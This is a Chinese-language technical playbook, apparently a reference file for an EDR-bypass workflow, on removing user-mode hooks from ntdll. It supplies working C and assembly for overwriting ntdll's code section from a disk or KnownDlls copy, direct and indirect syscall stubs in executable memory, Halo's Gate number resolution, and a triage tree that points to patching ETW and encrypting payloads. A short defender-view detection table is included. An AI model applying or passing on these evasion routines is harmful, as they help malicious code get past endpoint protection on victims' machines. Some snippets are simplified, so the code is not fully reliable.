# Unhook 技术：从磁盘重载、手动映射、直接/间接 syscall

> 被 `edr-bypass-re` 引用。**先侦查，再 unhook**（`hook-survey.md`）。
> 关键认知：unhook 只解决"用户态 inline hook"，
> **对 ETW-TI / 内核回调完全无效**，而这才是现代 EDR 的主战场。

## 一、六种手法对比

| 手法 | 原理 | 覆盖 hook 类型 | 噪声 | 成功率 |
| --- | --- | --- | --- | --- |
| **从磁盘重载 ntdll**（Peruns Fart / fresh copy） | 读磁盘文件，覆盖内存 `.text` | inline hook | 低（读文件） | 高（若磁盘干净） |
| **手动映射**（manual map） | 自己解析 PE，映射一份新副本 | inline hook | 中 | 高 |
| **直接 syscall**（direct） | 自己写 `syscall` 指令，跳过 stub | stub hook | 中（syscall 指令少见） | 高 |
| **间接 syscall**（indirect） | 跳到 ntdll 的 `syscall` 指令处执行 | stub hook + 地址校验 | 低 | 高 |
| **SysWhispers / Halo's Gate** | 动态解析 SSN + 间接 syscall | hook + SSN 篡改 | 低 | 高（需正确 SSN） |
| **Hardware breakpoint**（HWBP） | 用 DR 寄存器下断，不改代码 | inline hook（不改内存） | 低 | 中（DR 可被检测） |
| **恢复 single stub**（只修 ntdll 的一个函数） | 从磁盘复制该函数的字节 | 单点 hook | 低 | 中 |

## 二、从磁盘重载 ntdll（最常用）

### 2.1 核心步骤

```text
1. 用 CreateFile 打开 C:\Windows\System32\ntdll.dll（或 Sysnative 处理 WOW64）
2. 创建 section，映射为 image（SEC_IMAGE）→ 得到一份"干净"的映像
3. 找到当前进程里 ntdll 的 .text 段
4. VirtualProtect 改为 RWX（或 RW + 后续改回）
5. memcpy 干净 .text 覆盖过去
6. 恢复原保护属性
```

```c
#include <windows.h>

BOOL UnhookNtdll(VOID) {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hSection = NULL;
    HANDLE hView = NULL;
    BOOL ok = FALSE;

    // 1) 创建 image section（自动按 PE 布局映射）
    hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hSection) goto cleanup;

    hView = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!hView) goto cleanup;

    // 2) 定位当前进程的 ntdll 与其 .text 段
    PBYTE pLocal = (PBYTE)GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pLocal;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pLocal + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;

        LPVOID dst = pLocal + sec->VirtualAddress;
        LPVOID src = (PBYTE)hView + sec->VirtualAddress;
        SIZE_T len = sec->Misc_VirtualSize;

        DWORD old = 0;
        if (!VirtualProtect(dst, len, PAGE_EXECUTE_READWRITE, &old)) goto cleanup;
        memcpy(dst, src, len);                     // ★ 覆盖
        VirtualProtect(dst, len, old, &old);
        ok = TRUE;
        break;
    }

cleanup:
    if (hView) UnmapViewOfFile(hView);
    if (hSection) CloseHandle(hSection);
    CloseHandle(hFile);
    return ok;
}
```

### 2.2 WOW64 / Sysnative 陷阱

```text
32 位进程在 64 位系统上：
  C:\Windows\System32 被重定向到 SysWOW64（32 位 ntdll）
  32 位进程的 ntdll 是 SysWOW64\ntdll.dll
  要读真正的 64 位 ntdll → 用 C:\Windows\Sysnative\ntdll.dll

判断：
  IsWow64Process2 → 拿到当前进程的 machine 与 native machine
```

```c
BOOL IsWow64(VOID) {
    BOOL b = FALSE;
    IsWow64Process(GetCurrentProcess(), &b);
    return b;
}
// 路径选择：IsWow64() ? "C:\\Windows\\Sysnative\\ntdll.dll" : "C:\\Windows\\System32\\ntdll.dll"
```

### 2.3 失败场景（必须知道）

| 失败 | 原因 | 下一步 |
| --- | --- | --- |
| `CreateFileMapping(SEC_IMAGE)` 失败 | 磁盘文件被 EDR 锁/保护 | 用 `NtCreateSection` 或复制文件到 temp |
| 覆盖后立刻崩溃 | EDR 检测到 `.text` 变化并终止进程 | 换手动映射（不同地址）/ 换间接 syscall |
| 覆盖成功但功能异常 | 磁盘 ntdll 版本与内存不同 | 比对版本号，从 `%WinDir%\WinSxS` 或 backup 取同版本 |
| 读到的磁盘文件也带 hook | EDR 的 minifilter 对读文件做了重定向（返回带 hook 的副本） | 用 raw disk 读 / 换手法（这是已知的高级对抗） |

```text
第 4 行是真实存在的高级对抗：部分 EDR 在 minifilter 层拦截
对 ntdll.dll 的读取并返回"带 hook 的版本"。
应对：
  □ 从 WinSxS / Windows Backup 读同版本文件
  □ 通过 KnownDlls section 打开（\KnownDlls\ntdll.dll）
  □ 从另一个"未注入"的进程 dump 干净副本（如 smss.exe）
```

### 2.4 用 KnownDlls（更干净）

```c
// KnownDlls 里的 section 由系统在启动时创建，通常未被 EDR 改写
HANDLE hSec = NULL;
UNICODE_STRING name;
RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa = { sizeof(oa), &name, NULL, OBJ_CASE_INSENSITIVE };
NTSTATUS st = NtOpenSection(&hSec, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);
// 然后 NtMapViewOfSection 得到干净映像
```

## 三、手动映射（manual map）

```text
不走 LoadLibrary，自己：
  1. 读 PE 到内存
  2. 按 SizeOfImage 分配（VirtualAlloc）
  3. 复制头 + 各节
  4. 处理重定位（.reloc）
  5. 解析导入（IAT）—— 这一步最容易踩 EDR 的 hook
  6. 改内存保护（按节属性）
  7. 调 TLS 回调与 DllMain

对 unhook 的用途：把"干净 ntdll"映射到**另一个地址**，
然后自己写一份调用跳板（不覆盖原 ntdll）→ 完全绕开 inline hook 且不改原模块
```

| 风险 | 说明 |
| --- | --- |
| 未注册的模块（unbacked memory） | EDR 会扫 `MEM_PRIVATE` + `PAGE_EXECUTE` 区域 |
| IAT 解析触发 hook | `LoadLibrary`/`GetProcAddress` 本身可能被 hook |
| TLS 回调顺序 | 错了会崩（尤其 x86） |
| CFG（Control Flow Guard） | 跳到"非合法目标"会被 CFG 拦（需 `SetProcessValidCallTargets`） |

## 四、直接 syscall

### 4.1 原理

```asm
; ntdll 的 stub（可能被 hook）
mov r10, rcx
mov eax, 0x55          ; SSN
syscall
ret

; 直接 syscall（自己写，不经过 ntdll）
mov r10, rcx
mov eax, 0x55          ; 需要自己知道 SSN
syscall
ret
```

```nasm
; x64 内联汇编（MSVC 不支持 x64 内联 asm，需 .asm 文件或 intrinsic）
; 用 .asm：
.code
DoSyscall PROC
    mov r10, rcx
    mov eax, ecx        ; 简化：SSN 从参数传
    syscall
    ret
DoSyscall ENDP
END
```

```c
// 用函数指针 + 机器码（更通用，不依赖 .asm）
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

// 直接构造 stub：4C 8B D1 B8 <ssn:4> 0F 05 C3
BYTE stub[] = {
    0x4C, 0x8B, 0xD1,              // mov r10, rcx
    0xB8, 0x18, 0x00, 0x00, 0x00,  // mov eax, SSN（0x18 仅为示例值，必须按目标 build 实测）
    0x0F, 0x05,                    // syscall
    0xC3                           // ret
};
LPVOID p = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(p, stub, sizeof(stub));
((pNtAllocateVirtualMemory)p)(...);
```

**SSN 是版本相关的**——同一函数在不同 Windows build 上 SSN 不同。
硬编码只在确定的目标版本上可用。

### 4.2 SSN 获取（三种）

| 方法 | 做法 | 优点 | 缺点 |
| --- | --- | --- | --- |
| 硬编码 | 查表（按 build 号） | 简单 | 版本绑定 |
| 从 ntdll 读 | 读干净 stub 的 `mov eax, imm` | 准确 | 若 stub 被 hook 则读不到 |
| **Halo's Gate** | 若被 hook，看相邻函数的 SSN 递增推算 | 自愈 | 需相邻未 hook |
| **Tartarus Gate** | Halo's Gate 的增强（处理更复杂的 hook） | 鲁棒 | 实现复杂 |
| 从 PEB 的 `Ldr` 找 syscall 表 | 部分版本有 | — | 不稳定 |

```c
// Halo's Gate 核心思路
WORD GetSSN(PVOID pFunc) {
    PBYTE b = (PBYTE)pFunc;
    // 正常：4C 8B D1 B8 <ssn32>
    if (b[0]==0x4C && b[1]==0x8B && b[2]==0xD1 && b[3]==0xB8)
        return *(WORD*)(b+4);
    // 被 hook：向上/向下找邻居
    for (int i = 1; i < 32; i++) {
        PBYTE up = b - i*32, dn = b + i*32;
        if (up[0]==0x4C && up[1]==0x8B && up[2]==0xD1 && up[3]==0xB8)
            return *(WORD*)(up+4) + i;      // 邻居 SSN + 距离
        if (dn[0]==0x4C && dn[1]==0x8B && dn[2]==0xD1 && dn[3]==0xB8)
            return *(WORD*)(dn+4) - i;
    }
    return 0;
}
```

> Halo's Gate 依赖"函数在 SSDT 中按地址连续排列，SSN 也连续"。
> 这个假设在多数 Windows 版本成立，但**不保证**——跨版本要验证。

## 五、间接 syscall（最隐蔽）

```text
直接 syscall 的问题：syscall 指令出现在 **非 ntdll 的内存区域**（你的 shellcode），
EDR 可以扫"syscall 指令不在 ntdll 里"来发现。

间接 syscall：把 `syscall` 指令的**执行位置**放回 ntdll 里
  → 调用栈/指令地址看起来都正常
```

```c
// 1) 从 ntdll 里找一个 `syscall; ret` 的位置
PBYTE FindSyscallGadget(VOID) {
    PBYTE p = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    // 在 ntdll 的 .text 里搜 0F 05 C3
    // 更简单：NtClose 的 stub 尾部通常就是 syscall; ret
    for (int i = 0; i < 0x40; i++)
        if (p[i]==0x0F && p[i+1]==0x05 && p[i+2]==0xC3) return p+i;
    return NULL;
}

// 2) 构造 stub：设置 r10/rax 后 **跳到** 那个 gadget（而不是自己 syscall）
BYTE stub[] = {
    0x4C, 0x8B, 0xD1,                    // mov r10, rcx
    0xB8, 0x18, 0x00, 0x00, 0x00,         // mov eax, SSN（示例值）
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,   // jmp qword ptr [rip+0]  ← 跳到 gadget
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  // 目标地址（运行时填）
};
*(PVOID*)(stub + 15) = gadget;
```

| 对比 | 直接 syscall | 间接 syscall |
| --- | --- | --- |
| `syscall` 指令位置 | 自己的内存 | ntdll（看起来合法） |
| 调用栈 | 有"非模块返回地址" | 更像正常调用 |
| 检测面 | 内存扫描（`syscall` 在 unbacked 区） | 小得多 |
| 实现复杂度 | 低 | 中 |

## 六、成功判定与被拦后的下一步

| 现象 | 判定 | 下一步 |
| --- | --- | --- |
| 覆盖 `.text` 后进程立刻退出 | EDR 检测到代码段篡改 | 改用手动映射（不覆盖原模块） |
| 覆盖成功，但 `NtCreateFile` 仍被拦 | 拦截在**内核**（minifilter/callback） | unhook 无用 → 换行为（合法路径）或放弃该 API |
| 直接 syscall 后进程崩 | SSN 错 / 参数约定错（x64 syscall 用 `r10` 而非 `rcx` 作第 4 参数） | 从干净 stub 读 SSN，确认 `r10` 设置 |
| 间接 syscall 后仍告警 | EDR 用 ETW-TI 看行为（不看 hook） | 只能减少噪声（合法 API 序列） |
| unhook 后 10 秒内被杀 | 有**周期性完整性检查** | 定时重新 unhook / 或不做 unhook 改间接 syscall |

```text
"被拦后的正确下一步"决策树：
  1. 是用户态 hook 拦的？ → unhook / 间接 syscall（本条）
  2. 是 ETW-TI 报的？     → telemetry-blinding.md（patch ETW）
  3. 是内核 callback 拦的？→ 只能改行为（用合法进程/合法 API 序列）
  4. 是 minifilter 拦的？  → 改文件操作路径（换目录/换 API）
  5. 是内存扫描发现的？    → 换内存属性/加密载荷
```

## 七、检测视角（防守方）

| 手法 | 信号 |
| --- | --- |
| 覆盖 ntdll `.text` | 代码段 hash 变化（周期性完整性检查）；`VirtualProtect` 改 `.text` 为 RWX |
| 从磁盘读 ntdll | 文件读取事件（`ntdll.dll` 被非系统进程读取） |
| 手动映射 | `MEM_PRIVATE` + `PAGE_EXECUTE` 区域；无对应模块名 |
| 直接 syscall | `syscall` 指令出现在非 ntdll 区；调用栈无 ntdll 帧 |
| 间接 syscall | 呼叫栈的返回地址指向（`jmp` 而非 `call`）→ 栈不平衡 |
| HWBP | 线程上下文 DR0-DR7 非零 |
| unhook 后 | `.text` 与磁盘一致 → "过于干净"本身可疑（正常进程总有差异） |

## 八、验伤信号

| 声称 | 证据 |
| --- | --- |
| "unhook 成功" | 内存 ntdll 的 `.text` 与磁盘一致（diff = 0）+ 调用该 API 不再进入 EDR 模块 |
| "直接 syscall 生效" | 目标 API 行为正确（如成功分配内存）+ 调用栈里没有 ntdll stub 帧 |
| "间接 syscall 生效" | 同上，且 `syscall` 指令地址在 ntdll 范围内 |
| "被内核拦" | 用户态 unhook 后仍失败 → 说明拦截点在内核（这是有效结论） |

**反例（看起来成功其实是假）**：

- diff = 0 就报成功 → 可能你比的是**已被 EDR 改写的磁盘文件**（minifilter 重定向）
- 直接 syscall 返回 `STATUS_SUCCESS` 但对象没创建 → SSN 错，调到了别的函数
- unhook 后进程安静 → 其实 EDR 只是把告警延后（周期性扫描）
- 覆盖 `.text` 没崩 → 但 EDR 已记录"代码段篡改"事件，只是没立即处置

## 九、常见坑

1. **SSN 硬编码跨版本失效**——同一函数在 Win10 1909 与 22H2 的 SSN 不同。
   必须从目标系统的干净 stub 读，或用 Halo's Gate。
2. **x64 syscall 的调用约定**——第 4 个参数在 `r10`（不是 `rcx`），
   忘了设 `r10` 会导致参数错乱。
3. **WOW64 路径错**——32 位进程读 `System32` 得到的是 32 位 ntdll，
   覆盖后 64 位部分仍未修。
4. **只 unhook ntdll 不看 kernel32**——有些 EDR 也 hook `kernel32`/`kernelbase`，
   unhook ntdll 后仍被拦。
5. **覆盖后没恢复保护**——`.text` 保持 RWX，被 EDR 扫到"可写可执行代码段"。
6. **CFG/CET 环境**——间接跳转到 ntdll 的 gadget 可能被 CFG 拦。
   Win11 的 CET（影子栈）会让 ROP 类手法直接失败。
7. **以为 unhook 能解决一切**——ETW-TI 与内核回调根本不看用户态 hook，
   这类环境下 unhook 只降低噪声，不改变检测结果。